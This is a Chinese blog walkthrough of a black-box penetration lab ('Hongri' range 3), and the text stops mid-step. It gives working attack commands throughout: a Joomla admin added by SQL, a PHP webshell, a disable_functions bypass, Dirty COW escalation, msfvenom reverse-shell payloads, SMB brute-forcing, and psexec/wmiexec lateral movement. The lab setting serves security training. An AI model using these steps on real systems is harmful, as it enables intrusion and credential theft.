@@ -1,0 +1,403 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>红日靶场三 | micgo's blog</title><meta name="keywords" content="红日"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="本环境为黑盒测试，在不提供虚拟机帐号密码的情况下进行黑盒测试拿到域控里面的flag。涉及敏感信息泄露、暴力破解、脏牛提权、内网穿透、端口转发、以及域渗透等多种知识点 环境搭建    新建一个VMnet2   本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录。已知出网主机为centos主机，将centos出网网卡和kali攻击机网卡都设置为NAT模式，其它网卡都默认vmnet2模式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场三">
+<meta property="og:url" content="https://micgo.top/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%89/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="本环境为黑盒测试，在不提供虚拟机帐号密码的情况下进行黑盒测试拿到域控里面的flag。涉及敏感信息泄露、暴力破解、脏牛提权、内网穿透、端口转发、以及域渗透等多种知识点 环境搭建    新建一个VMnet2   本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录。已知出网主机为centos主机，将centos出网网卡和kali攻击机网卡都设置为NAT模式，其它网卡都默认vmnet2模式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2023-04-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-25T12:02:40.848Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="红日">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场三',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-25 20:02:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场三</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-24T16:00:00.000Z" title="发表于 2023-04-25 00:00:00">2023-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-25T12:02:40.848Z" title="更新于 2023-04-25 20:02:40">2023-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场三"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本环境为黑盒测试，在不提供虚拟机帐号密码的情况下进行黑盒测试拿到域控里面的flag。涉及敏感信息泄露、暴力破解、脏牛提权、内网穿透、端口转发、以及域渗透等多种知识点</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424132724840.png" alt="image-20230424132724840" style="zoom:62%;" />
+
+
+
+<p>新建一个VMnet2</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424121617118.png" alt="image-20230424121617118" style="zoom: 55%;" />
+
+<p>本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录。已知出网主机为centos主机，将centos出网网卡和kali攻击机网卡都设置为NAT模式，其它网卡都默认vmnet2模式</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424131911640.png" alt="image-20230424131911640"></p>
+<p>开启centos，第一次运行，需重新获取桥接模式网卡ip，service network restart。查看ip发现两个网段192.168.48.0&#x2F;24(出网ip）和192.168.93.0&#x2F;24（内网ip）</p>
+<p>在kali上ping一下出网主机，看能否连通。开启所有主机，靶场搭建完毕</p>
+<h4 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h4><p>因为是黑盒测试，所以我们现在并不知道出网主机的ip。使用nmap扫描整个网段，探测存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -T4 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -A 192.168.1.110</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424214228435.png" alt="image-20230424214228435"></p>
+<p>dirsearch进行目录扫描，发现configuration.php，administrator</p>
+<p>访问administrator管理员后台，测试不存在默认口令&#x2F;弱口令，但configuration.php中发现管理员备份的数据库密码</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424214547262.png" alt="image-20230424214547262" style="zoom:80%;" />
+
+
+
+<h5 id="连接mysql"><a href="#连接mysql" class="headerlink" title="连接mysql"></a>连接mysql</h5><p>用上面找到的数据库密码连接上mysql。翻数据找管理员的帐号，管理员帐号肯定是找带有user字段跟password字段的，发现<code>umnbt_users</code>这个表跟管理员帐号最相似，但password这个地方不是明文</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424214506079.png" alt="image-20230424214506079"></p>
+<p>访问80端口的网站，CMS是Joomla，用kali自带工具joomscan进行扫描，扫描出joomla版本为3.9.12</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.1.110</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424214651742.png" alt="image-20230424214651742" style="zoom: 50%;" />
+
+<p>joomla官网虽然没有直接公布密码的加密方式，但是它为了防止用户忘记密码增加了一个添加超级管理员用户的方式，就是通过登录数据库执行sql语句达到新建超级管理员的效果</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424135616576.png" alt="image-20230424135616576" style="zoom: 56%;" />
+
+<p>这里我们可以发现sql语句中的<code>VALUES</code>中的第三项为密文，这里我们为了方便就用他给我们的这一串密文，这里对应的密码为<code>secret</code>，当然也可以用其他对应的密文如下所示</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424135855584.png" alt="image-20230424135855584" style="zoom: 60%;" />
+
+<p>执行sql语句，添加一个<code>admin2 secret</code>这个新的超级管理员用户</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222048999.png" alt="image-20230424222048999" style="zoom: 67%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222041185.png" alt="image-20230424222041185" style="zoom:67%;" />
+
+<p>或者直接用update修改数据库密码</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222308086.png" alt="image-20230424222308086"></p>
+<p>使用<code>admin2 secret</code>登录joomla后台。进入后台，找可以上传文件的地方上传图片马或者找一个能够写入sql语句的地方</p>
+<h5 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h5><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222353266.png" alt="image-20230424222353266" style="zoom:67%;" />
+
+<p>经过谷歌后发现，joomla的后台有一个模板的编辑处可以写入文件，这里找到<code>Extensions-&gt;Template-&gt;Templates</code></p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222413724.png" alt="image-20230424222413724" style="zoom:50%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222420713.png" alt="image-20230424222420713" style="zoom:47%;" />
+
+<p>模板前面有<code>&lt;?php</code>前缀，只需要一句话木马中间部分，然后保存</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424222459219.png" alt="image-20230424222459219" style="zoom:60%;" />
+
+<p>使用蚁剑连接</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424140508934.png" alt="image-20230424140508934" style="zoom: 60%;" />
+
+<p>发现无法执行命令，命令执行返回的是127</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230424140543743.png" alt="image-20230424140543743" style="zoom: 60%;" />
+
+<p>应该是<code>disable_functions</code>禁用了命令执行的函数，在windows下绕过<code>disable_functions</code>的方法很少，但在linux里面绕过<code>disable_functions</code>的方法有很多</p>
+<h5 id="绕过disable-functions"><a href="#绕过disable-functions" class="headerlink" title="绕过disable_functions"></a>绕过disable_functions</h5><p>可以使用蚁剑里自带的插件绕过</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425091734665.png" alt="image-20230425091734665" style="zoom:62%;" />
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425091400305.png" alt="image-20230425091400305"></p>
+<p>或者使用github上的 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">通过 LD_PRELOA 绕过 disable_functions</a></p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425085142090.png" alt="image-20230425085142090" style="zoom: 60%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bypass_disablefunc.php?cmd=id&amp;outpath=/tmp/123&amp;&amp;sopath=/tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425085240599.png" alt="image-20230425085240599"></p>
+<h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><p>ifconfig一下，发现这里的ip是另一个网段的ip。就是说我们之前拿到的那台linux的192.168.1.0&#x2F;24这个网段相当于一个公网IP，但是真正的主机应该是192.168.93.0&#x2F;24，但这个是一个内网网段，所以说最符合这种情况的就是nginx反向代理</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425092205547.png" alt="image-20230425092205547" style="zoom:70%;" />
+
+<p>翻翻文件，在<code>/tmp</code>目录下发现了一个文件test.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser wwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>
+
+<p>由于服务器开启了SSH服务于是尝试登录一下，成功登上。经过简单信息搜集发现这是一台双网卡机器，并且内核较老，可以使用脏牛漏洞提权</p>
+<h5 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a><a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow">脏牛提权</a></h5><p>由于编译器的不同，把kali编译好的脏牛提权exp上传到靶机执行，会报错。所以上传dirty.c到靶机上编译执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt	//编译dirty.c</span><br><span class="line">./dirty 123456	//创建一个高权限用户，密码为123456</span><br></pre></td></tr></table></figure>
+
+<p>执行成功，脏牛执行成功过后会自动生成一个名为<code>firefart</code>的高权限用户，密码就是我们刚才设置的123456</p>
+<p>切换到<code>firefart</code>用户进行查看</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425184756536.png" alt="image-20230425184756536"></p>
+<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ul>
+<li>elf文件上线</li>
+</ul>
+<p>生成linux马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.48.136 LPORT=4444 -f elf &gt; a.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659279424_62e6984016dd95afca025.png!small" alt="img"></p>
+<p>msf监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.1.128</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>centos上执行msf马即可上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x a.elf</span><br><span class="line">./a.elf</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>反弹shell</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7    </span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.128</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20210708154117371.png" alt="image-20210708154117371"></p>
+<p>将payload复制到centos执行</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20210708154307204.png" alt="image-20210708154307204"></p>
+<p>反弹shell成功</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20210708154359991.png" alt="image-20210708154359991" style="zoom: 80%;" />
+
+
+
+<p>设置socks代理，对192.168.93.0&#x2F;24网段进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.93.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>扫描发现内网里有3台主机存活，分别是192.168.93.10  192.168.93.20  192.168.93.30</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425191559575.png" alt="image-20230425191559575" style="zoom:80%;" />
+
+<p>继续扫描详细信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV 192.168.93.10 192.168.93.20 192.168.93.30</span><br></pre></td></tr></table></figure>
+
+<p>10这台主机开启了53端口DNS服务，大概率为域控</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425191711995.png" alt="image-20230425191711995" style="zoom:80%;" />
+
+<p>20这台主机开的都是几个常规端口，值得注意的就是1433端口，意味着20这台主机上有mssql服务</p>
+<p>30这台主机也是开了几个常规端口，跟前面两台主机相比就没什么特征端口，应该是一个普通的域成员主机</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425191814511.png" alt="image-20230425191814511" style="zoom:62%;" />
+
+
+
+<h5 id="永恒之蓝尝试"><a href="#永恒之蓝尝试" class="headerlink" title="永恒之蓝尝试"></a>永恒之蓝尝试</h5><p>三台主机都开了139、445端口，那么先使用永恒之蓝模块先批量扫描一波看有没有可以直接用永恒之蓝打下来的主机。没有能够直接用永恒之蓝拿下的主机，win7跟2008匿名管道都没有开所以利用不了</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425192059026.png" alt="image-20230425192059026" style="zoom:80%;" />
+
+
+
+<h5 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h5><p>这三台主机都开了445端口，可以使用smb，使用msf中的<code>smb_login</code>模块进行密码枚举尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.30</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set PASS_FILE /tmp/1W.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659279976_62e69a68a5a4afe14e084.png!small" alt="img"></p>
+<p>爆破出30主机密码为123qwe!ASD</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659279991_62e69a77d8f640a713719.png!small" alt="img"></p>
+<p>爆破出10主机密码为zxcASDqw123!!</p>
+<p>20主机爆破报错，换工具爆破，使用kali自带工具hydra</p>
+<img src="https://image.3001.net/images/20220731/1659280015_62e69a8f1eb9142962b3c.png!small" alt="img" style="zoom:120%;" />
+
+<p>成功爆破出2008密码也为123qwe!ASD</p>
+<h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><h6 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h6><p>使用msf自带模块进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass 123qwe!ASD</span><br><span class="line">set RHOSTS 192.168.93.30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280060_62e69abc7a060dd8e82fd.png!small" alt="img" style="zoom:120%;" />
+
+<p>成功拿下30主机，获得会话后进行进程迁移，不然很开会断掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure>
+
+<p>用同样的方法，在2008主机和2012主机上失败</p>
+<h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用impacket包中的wmiexec工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220731/1659280105_62e69ae9a6d04a4d82328.png!small" alt="img"></p>
+<p>成功获得10主机cmd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py &#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20220731/1659280125_62e69afd4ec2cae788f20.png!small" alt="img"></p>
+<p>成功获得20主机cmd</p>
+<p>只有CMD且没有与外网连接，想要上传文件只能通过3389远程连接。开远程桌面功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+<p>防火墙放行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall set rule group=&quot;Remote Desktop&quot; new enable=yes</span><br></pre></td></tr></table></figure>
+
+<p>连接2012主机的远程桌面失败</p>
+<p>成功连接2008的远程桌面</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280271_62e69b8ff3caa724cfc4f.png!small" alt="img" style="zoom:80%;" />
+
+<p>登录时记得要切换用户为administrator</p>
+<p>生成一个msf bind的马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.48.136 LPORT=5555 -f exe &gt; shell1.exe</span><br></pre></td></tr></table></figure>
+
+<p>将马通过远程连接上传到2008主机上</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280305_62e69bb1d9a9c5fcdc103.png!small" alt="img"></p>
+<p>在kali上进行监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.93.20</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>远程桌面执行msf马</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280335_62e69bcf18b806d110f87.png!small" alt="img"></p>
+<p>通过getsystem提权，成功获得system权限</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280352_62e69be05d4ca357adae1.png!small" alt="img"></p>
+<p>进程迁移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure>
+
+<p>2012主机无法通过远程桌面上传文件，想到可以用文件共享</p>
+<p>在获得2012主机的CMD中执行命令</p>
